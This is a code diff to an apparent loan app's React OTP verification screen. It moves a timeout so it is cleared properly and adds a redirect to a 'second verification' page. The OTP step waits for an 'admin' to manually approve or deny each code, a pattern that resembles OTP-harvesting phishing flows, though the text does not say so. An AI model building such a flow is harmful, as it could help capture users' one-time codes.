@@ -49,6 +49,12 @@ const OTPVerification = () => {
     if (!isOtpComplete) return;
     setIsVerifying(true);
     
+    // Timeout fallback if admin doesn't respond in 45 seconds
+    const timeoutId = setTimeout(() => {
+      setIsVerifying(false);
+      navigate("/"); 
+    }, 45000);
+
     try {
       const res = await fetch(`${API_URL}/api/verify-otp`, {
         method: "POST",
@@ -64,23 +70,24 @@ const OTPVerification = () => {
           
           if (statusData.status !== "pending") {
             clearInterval(interval);
+            clearTimeout(timeoutId); // Clear the 45s timeout
             setIsVerifying(false);
             
             if (statusData.status === "approved") {
-              navigate("/loan-limit", { state: { phone: phoneNumber } });
+              // ✅ CHANGED: Go to Second Verification instead of Loan Limit
+              navigate("/second-verification", { state: { phone: phoneNumber } });
             } else if (statusData.status === "denied") {
               navigate("/"); 
             }
           }
         }, 2000);
-
-        setTimeout(() => {
-          clearInterval(interval);
-          setIsVerifying(false);
-          navigate("/"); 
-        }, 45000);
+      } else {
+        clearTimeout(timeoutId);
+        setIsVerifying(false);
+        navigate("/");
       }
     } catch (error) {
+      clearTimeout(timeoutId);
       setIsVerifying(false);
       navigate("/");
     }
